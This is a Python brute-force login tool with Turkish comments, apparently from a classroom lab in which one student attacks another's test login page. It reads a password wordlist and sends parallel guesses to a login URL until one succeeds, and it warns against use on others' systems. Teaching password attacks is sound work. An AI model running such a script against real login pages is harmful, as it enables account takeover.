"""
Brute-Force Saldırı Aracı  —  KİŞİ A (saldırı tarafı) bu dosyayı çalıştırır.

HAFTA 2 — THREADING (paralel deneme):
  Hafta 1'de parolalar TEK TEK (sırayla) deneniyordu; her deneme bir
  öncekinin cevabını bekliyordu. Burada ThreadPoolExecutor ile AYNI ANDA
  birden çok parola deniyoruz. Doğru parola bulununca bir "dur" sinyali
  (threading.Event) ile diğer iş parçacıkları da durur.

UYARI: Bu aracı SADECE kendi kurduğunuz login sistemine karşı çalıştırın.
       Başkasına ait sistemlere brute-force yapmak yasa dışıdır.

Çalıştırma:
    pip install requests
    python attack.py
"""

import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor

# --- Ayarlar ----------------------------------------------------------------
TARGET_URL = "http://localhost:5000/login"   # <-- Kişi B'nin IP'siyle değiştir
USERNAME = "admin"                            # denenecek kullanıcı adı
WORDLIST = "wordlist.txt"                     # parola listesi
THREADS = 10                                  # AYNI ANDA kaç deneme gönderilsin

# --- Paylaşılan durum (bütün thread'ler bunları görür) ----------------------
found_event = threading.Event()   # doğru parola bulununca "dur" sinyali
found_password = None             # bulunan parola buraya yazılır
attempts = 0                      # kaç deneme gönderildi
lock = threading.Lock()           # ortak değişkenleri aynı anda bozmamak için


def load_passwords(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def try_password(password):
    """Tek bir parolayı dener. Havuzdaki her işçi bu fonksiyonu çağırır."""
    global found_password, attempts

    # Başka bir thread parolayı bulduysa, boşuna deneme yapma.
    if found_event.is_set():
        return

    data = {"username": USERNAME, "password": password}
    try:
        resp = requests.post(TARGET_URL, data=data, timeout=5)
    except requests.RequestException:
        return  # ağ hatası olursa bu denemeyi atla

    # Ortak sayacı kilitle-yaz-bırak (iki thread aynı anda bozmasın).
    with lock:
        attempts += 1

    success = "başarılı" in resp.text.lower() or "basarili" in resp.text.lower()
    if success:
        with lock:
            found_password = password
        found_event.set()             # diğer thread'lere "durun" de
        print(f"  ✔ BULUNDU -> {password}")
    else:
        print(f"  ✗ {password}")


def main():
    passwords = load_passwords(WORDLIST)
    print(f"[SALDIRI] Hedef    : {TARGET_URL}")
    print(f"[SALDIRI] Kullanıcı: {USERNAME}")
    print(f"[SALDIRI] {len(passwords)} parola  /  {THREADS} paralel thread\n")

    start = time.time()
    # Havuzu aç: THREADS kadar işçi, listedeki her parolayı bir işçi dener.
    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        pool.map(try_password, passwords)
    elapsed = time.time() - start

    print()
    if found_password:
        print(f"[SONUÇ] Parola bulundu: '{found_password}'")
    else:
        print("[SONUÇ] Parola listede bulunamadı.")
    print(f"[SONUÇ] {attempts} deneme, {elapsed:.2f} saniyede.")


if __name__ == "__main__":
    main()
